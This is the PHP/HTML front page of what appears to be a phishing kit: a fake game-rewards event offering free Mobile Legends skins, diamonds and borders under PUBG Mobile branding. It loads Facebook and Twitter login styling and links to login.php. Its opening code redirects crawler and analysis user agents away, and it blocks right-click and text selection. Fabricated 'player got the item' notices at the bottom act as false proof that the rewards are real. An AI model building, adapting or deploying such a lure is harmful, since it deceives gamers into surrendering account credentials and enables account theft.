<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}

// MENGAMBIL KONTROL
include("system/setting.php");
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="<?php echo $title;?>">
<meta name="description" content="<?php echo $description;?>">
<meta property="og:description" content="<?php echo $description;?>">
<meta property="og:url" content="./">
<meta property="og:site_name" content="<?php echo $title;?>">
<meta property="og:type" content="website">
<meta name="copyright"content="<?php echo $copyright;?>">
<meta name="theme-color" content="<?php echo $theme;?>">
<meta property="og:image" content="<?php echo $image;?>">
<title><?php echo $title;?></title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="css/login/facebook.css">
<link rel="stylesheet" href="css/login/twitter.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="<?php echo $icon;?>">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
 <style type="text/css">
 body {
	background:url(https://bagasarya.xyz/img/border/background.png) center / cover no-repeat;
	margin: 0;
	font-family: 'Teko';
}
.container {
	background: url(https://www.pubgmobile.com/images/event/royalepassm18/bg_2.jpg) no-repeat center center;
	background-size: cover;
	position: relative;
	margin: 0px auto;
	max-width: 400px;
	height: auto;
	border: 1px solid #fff;
}
.navbar-logo {
	width: 130px;
	float: left;
	margin-top: 15px;
	margin-left: -5px;
}
 .item {
	width: 26%;
	height: 138px;
	margin: 10px;
	margin-bottom: 35px;
	display: inline-block;
}
.popup-box-item {
	width:23%;
	height:105px;
	margin-left:auto;
	margin-right:auto;
	text-align: right;
	display: block;
}
.event-title-txt {
	margin-bottom: 5px;
	padding-top: 0px;
	color: #F7D794;
	font-size: 1.85rem;
	font-family: Teko;
	font-weight: bold;
	text-align: center;
	text-shadow: 0px 2.3px 0px #6B5D39;
	text-transform: uppercase;
}
.event-subtitle {
    display: block;
    margin-left: 50px;
    margin-right: 5%;
    margin-top: -15px;
    margin-bottom: 15px;
    overflow: hidden;
    text-align: center;
	font-family: Teko;
    white-space: nowrap;
    width: 74%;
}
.event-title-wrapper {
	width: 95%;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 15px;
	display: block;
}
.footer-copyright-icon {
	width: 30%;
	margin-left: auto;
	margin-right: auto;
	display: block;
}
.header-twitter img {
    width: 60;
	margin-left: 140px;
	float: left;
}
.txt-login-twitter {
	padding-top: 10px;
	padding-left: 95px;
    color: #000;
    font-size: 20px;
    font-weight: bold;
    font-family: arial, sans-serif;
	text-align: left;
    margin-bottom: 3%;
}
.menu-content {
	background:url(img/menu-off.png) no-repeat center center;
	background-size:100% 100%;
	width: 35%;
	height: auto;
	padding: 6px;
	color: #dcca9c;
	font-size: 17px;
	font-family:'Teko', sans-serif;
	font-weight: 500;
	text-align: center;
	border: none;
	cursor: pointer;
}
.menu-content-active {
	background:url(img/menu-on.png) no-repeat center center;
	background-size:100% 100%;
}
.kanan {
	margin-right: -5%;
}
.kiri {
	margin-left: -5%;
}
.tengah {
	margin-left: auto;
	margin-right: auto;
	display: block;
}
.rewards-box-navbar {
	background:url(img/rewards-box-navbar.png) no-repeat center center;
	background-size:100% 100%;
	width: 95%;
	height: auto;
	margin-left: auto;
	margin-right: auto;
	display: block;
}
.rewards-box-content {
	background:url(img/rewards-box-content.png) no-repeat center center;
	background-size:100% 100%;
	width: 95%;
	height: auto;
	margin-left: auto;
	margin-right: auto;
	margin-top: -12px;
	margin-bottom: 15px;
	padding: 10px;
	padding-top: 0px;
	padding-bottom: 25px;
	display: block;
}
.event-title {
	background:url(https://i.ibb.co/VH7V8Pn/20220811-180040.png) no-repeat center center;
	background-size:100% 100%;
	width:95%;
	height:88px;
	margin-top:15px;
	margin-left:auto;
	margin-right:auto;
	margin-bottom:15px;
	display:block;
}
.event-notification {
	background: url(img/event-notification.png) no-repeat center center;
	background-size: 100% 100%;
	width: 95%;
	height: auto;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 8px;
	color: #dcca9c;
	font-size: 19px;
	font-family: Teko;
	text-align: left;
	display: block;
}
.event-notification img {
	width: 35px;
}
.event-notification img:nth-child(1) {
	padding-top: 0.5px;
	padding-left: 5px;
	padding-right: 5px;
	float: left;
}
.event-notification img:nth-child(2) {
	padding-top: 0.5px;
	padding-left: 5px;
	padding-right: 5px;
	float: right;
}
.event-notification-timer {
	padding-right: 5px;
	padding-top: 2px;
	float: right;
}
.event-notification i {
	padding-right: 5px;
	color: #dcca9c;
	font-size: 20px;
}
 </style>
<div class="container">
<div class="navbar">
<img onclick='location.href="login.php";' class="navbar-logo" src="https://i.postimg.cc/RFxVt2PL/IMG-20220518-122857.png">
<div class="navbar-right">
<img class="navbar-language" src="https://www.pubgmobile.com/en/images/nav_menu.svg">
</div> <!--- navbar-right --->
</div> <!--- navbar --->
<div class="header">
<img style="width: 100%" src="https://img.youtube.com/vi/ROy5rWjJBNU/maxresdefault.jpg">
</div> <!--- header --->
<div class="event-title"></div>
<!--- event-title --->
<div class="event-notification">
<img src="img/event-notification-icon.png">
Rewards available until
<div class="event-notification-timer"><i class="zmdi zmdi-timer"></i><span id="latestTimer"></span></div> <!--- event-notification-timer --->
</div> <!--- event-notification --->
<div class="box">
<div class="menu-wrapper-border"></div> <!--- menu-wrapper-border --->
<div class="menu-wrapper">
<div class="rewards-box-navbar">
<div class="menu-content kanan" onmousedown="buka.play();" onclick="openRewards(event, 'other');">Diamond</div> <!--- menu-content --->
<div class="menu-content kiri" onmousedown="buka.play();" onclick="openRewards(event, 'season');" id="defaultTabRewards">Limited Skins</div> <!--- menu-content --->
<div class="menu-content tengah" onmousedown="buka.play();" onclick="openRewards(event, 'weapon');">Borders</div> <!--- menu-content --->
</div> <!--- rewards-box-navbar --->
</div> <!--- menu-wrapper --->
<div class="rewards-box-content">
<center>
<div class="tab_rewards" id="season">
<div class="scroll">
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/X7kfYXd5/Xavierjjk.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/X7kfYXd5/Xavierjjk.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/KYRBfNV7/Juliann-Jjk.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/KYRBfNV7/Juliann-Jjk.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/QMw5y7G2/yinJjk.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/QMw5y7G2/yinJjk.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/qvm22YmM/melisajjk.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/qvm22YmM/melisajjk.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/BbyF7zDF/Claude-kbrstore.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/BbyF7zDF/Claude-kbrstore.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/BbtDg38s/Fanny-kbrstore.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/BbtDg38s/Fanny-kbrstore.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/63Dymz1q/IMG-20230124-WA0049.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/63Dymz1q/IMG-20230124-WA0049.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/Jncn4Jr4/IMG-20230124-WA0050.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/Jncn4Jr4/IMG-20230124-WA0050.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/kGLXTyws/IMG-20230124-WA0051.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/kGLXTyws/IMG-20230124-WA0051.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/66FvjV8F/IMG-20230124-WA0052.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/66FvjV8F/IMG-20230124-WA0052.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/bvGPBnDF/IMG-20230124-WA0053.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/bvGPBnDF/IMG-20230124-WA0053.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/BBz3Mt9/1673016816213.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.ibb.co/BBz3Mt9/1673016816213.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/GWM94Hx/1673097440815.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.ibb.co/GWM94Hx/1673097440815.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/8zcrx9Rx/IMG-20221222-204556.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/8zcrx9Rx/IMG-20221222-204556.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/SNy9fJJS/IMG-20221222-204658.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/SNy9fJJS/IMG-20221222-204658.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/jdZ7gt7z/IMG-20221222-204720.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/jdZ7gt7z/IMG-20221222-204720.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/4.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/4.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/5.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/5.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/6.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/6.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/7.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/7.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/qv5dSCJX/Bagasarya-Lesley-Star.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/qv5dSCJX/Bagasarya-Lesley-Star.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/1.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/1.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/2.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/2.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/3.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/3.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/2NbgDdv/IMG-20221022-121321.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.ibb.co/2NbgDdv/IMG-20221022-121321.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/FD2S2Jd/IMG-20221022-121346.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.ibb.co/FD2S2Jd/IMG-20221022-121346.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/30Mfgd4/IMG-20221022-121407.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.ibb.co/30Mfgd4/IMG-20221022-121407.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/F0W2RX4/IMG-20221022-121435.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.ibb.co/F0W2RX4/IMG-20221022-121435.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/YLq3wVv/IMG-20221001-172227.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.ibb.co/YLq3wVv/IMG-20221001-172227.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/qdcxRWH/IMG-20221001-172257.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.ibb.co/qdcxRWH/IMG-20221001-172257.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/sxtPc197/1661772927382.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/sxtPc197/1661772927382.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/3kK18tF/1661337953268.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.ibb.co/3kK18tF/1661337953268.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/sHCMx01/1661337857469.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.ibb.co/sHCMx01/1661337857469.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/Lp9Bnrc/1661337912443.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.ibb.co/Lp9Bnrc/1661337912443.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/NNVZ6Bj/1661337890778.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.ibb.co/NNVZ6Bj/1661337890778.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/Tq95WdX/kbrstore-sun.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.ibb.co/Tq95WdX/kbrstore-sun.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/N6B5NN2/kbrstore-natan.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.ibb.co/N6B5NN2/kbrstore-natan.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/k44dp4r/IMG-20220802-214423.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.ibb.co/k44dp4r/IMG-20220802-214423.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/6RVBVbJ/kbrstore-luoyi.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.ibb.co/6RVBVbJ/kbrstore-luoyi.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/BZqh9K2/kbrstore-kimmy.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.ibb.co/BZqh9K2/kbrstore-kimmy.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/p22Xvd1/kbrstore-yss.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.ibb.co/p22Xvd1/kbrstore-yss.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/MspFG9t/Remini20220611131253287.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.ibb.co/MspFG9t/Remini20220611131253287.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/P4MQZkT/Remini20220611131130808.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.ibb.co/P4MQZkT/Remini20220611131130808.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/G5fJm2M/Remini20220611131149746.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.ibb.co/G5fJm2M/Remini20220611131149746.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/6Q28NpYw/IMG-20220524-181348.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/6Q28NpYw/IMG-20220524-181348.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/PJxGBPQQ/IMG-20220524-181326.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/PJxGBPQQ/IMG-20220524-181326.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/0QVFd91M/IMG-20220524-181304.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/0QVFd91M/IMG-20220524-181304.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/fyJcLQjr/1650272368820.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/fyJcLQjr/1650272368820.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/W3vX7c5g/IMG-20220513-160904.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/W3vX7c5g/IMG-20220513-160904.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/x1mY0VSq/kbr-legend-guin.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/x1mY0VSq/kbr-legend-guin.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/QxLT8s2W/kbr-M-World-ling.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/QxLT8s2W/kbr-M-World-ling.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/284B3MY9/kbr-M-World-Wan-Wan.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/284B3MY9/kbr-M-World-Wan-Wan.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/vZbxnhHY/kbr-M-World-yin.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/vZbxnhHY/kbr-M-World-yin.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/ZqfN4NmT/kbr-515-zilong.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/ZqfN4NmT/kbr-515-zilong.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/wvZssd3Z/kbr-515 eParty-angela.jpgg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/wvZssd3Z/kbr-515 eParty-angela.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/909wdN7M/kbr-515 eParty-claude.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/909wdN7M/kbr-515 eParty-claude.jpg">Collect</button>
</div>
</div>
</div> <!--- scroll --->
</div> <!--- tab-rewards --->
<div class="tab_rewards" id="weapon"> <!--- Borders --->
<div class="scroll">
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/CLvc5py5/20220622-011746.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/CLvc5py5/20220622-011746.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/JhH6S62n/20220622-011823.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/JhH6S62n/20220622-011823.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/Tw87xVzc/20220622-011910.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/Tw87xVzc/20220622-011910.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/SNQZmNvH/20220622-011934.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/SNQZmNvH/20220622-011934.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/j2cZyGL8/20220622-011954.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/j2cZyGL8/20220622-011954.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/qR8mvt0H/20220622-012050.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/qR8mvt0H/20220622-012050.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/59S7cFnw/20220622-012132.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/59S7cFnw/20220622-012132.jpg">Collect</button>
</div>
</div>

</div> <!--- scroll --->
</div> <!--- tab-rewards --->
<div class="tab_rewards" id="other"> <!--- Diamond --->
<div class="scroll">
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/wjZ6477D/20220622-084916.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_otherReward_confirmation(this);" src="https://i.postimg.cc/wjZ6477D/20220622-084916.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/ht9C6YGM/20220622-084935.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_otherReward_confirmation(this);" src="https://i.postimg.cc/ht9C6YGM/20220622-084935.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/Xv42bgGW/20220622-084957.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_otherReward_confirmation(this);" src="https://i.postimg.cc/Xv42bgGW/20220622-084957.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/QtM0BxJn/20220622-085010.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_otherReward_confirmation(this);" src="https://i.postimg.cc/QtM0BxJn/20220622-085010.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/1zBv5Nwq/20220622-085026.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_otherReward_confirmation(this);" src="https://i.postimg.cc/1zBv5Nwq/20220622-085026.jpg">Collect</button>
</div>
</div>
</div> <!--- scroll --->
</div> <!--- tab-rewards --->
</div> <!--- rewards-box-content --->
</center>
</div> <!--- footer-socmed-box --->
<div class="event-notification" style="text-align: center;">
<img src="img/event-notification-icon.png">
<img src="img/event-notification-icon.png">
<div class="event-notification-player">JerryTzy but diff: Got the item Xavier Satoru Gojo</div> <!--- event-notification-player --->
<div class="event-notification-player">a9 Isn't Scared Got the item Magic Crystal</div> <!--- event-notification-player --->
<div class="event-notification-player">Chontol Got the item Sea Of Anvil Crawlers</div> <!--- event-notification-player --->
<div class="event-notification-player">BUGS BUNNY Got the item 2049 Diamonds</div> <!--- event-notification-player --->
